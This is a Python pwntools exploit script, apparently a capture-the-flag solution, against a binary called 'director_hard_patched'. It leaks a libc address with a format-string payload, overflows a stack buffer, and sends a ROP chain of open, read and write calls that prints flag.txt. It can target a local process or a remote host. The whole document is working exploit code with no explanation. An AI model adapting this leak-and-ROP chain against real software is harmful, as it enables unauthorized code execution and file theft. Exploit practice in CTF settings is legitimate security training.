#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./director_hard_patched', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            b*main+126
            ''')
    
    return p

p = setup()

payload = b'%3$p'
p.sendlineafter(b'Input:', payload)
p.recvuntil(b'0x')
libc.address = int(p.recvline().strip(), 16) - 0x1148f7
success(f'Libc base address: {hex(libc.address)}')

pop_rdi = 0x000000000002a3e5
pop_rsi = 0x000000000002be51
pop_rdx_r12 = 0x000000000011f357
pop_rax = 0x0000000000045eb0

flag = 0x404b00 - 0x90
payload = b'A' * 272 + p64(0x404b00) + p64(0x0000000000401299)
p.sendlineafter(b'Input:', payload)
p.sendlineafter(b'Input:', b'flag.txt\x00')

payload = b'A' * 128 + b'flag.txt\x00'
payload = payload.ljust(280, b'A')
# payload = b'A' * 280
payload += p64(libc.address + pop_rdi) + p64(flag)
payload += p64(libc.address + pop_rsi) + p64(0)
payload += p64(libc.address + pop_rdx_r12) + p64(0) + p64(0)
payload += p64(libc.sym.open)

payload += p64(libc.address + pop_rdi) + p64(3)
payload += p64(libc.address + pop_rsi) + p64(0x404b00)
payload += p64(libc.address + pop_rdx_r12) + p64(0x50) + p64(0)
payload += p64(libc.sym.read)

payload += p64(libc.address + pop_rdi) + p64(1)
payload += p64(libc.address + pop_rsi) + p64(0x404b00)
payload += p64(libc.address + pop_rdx_r12) + p64(0x50) + p64(0)
payload += p64(libc.sym.write)

p.sendlineafter(b'Input:', payload)

p.interactive()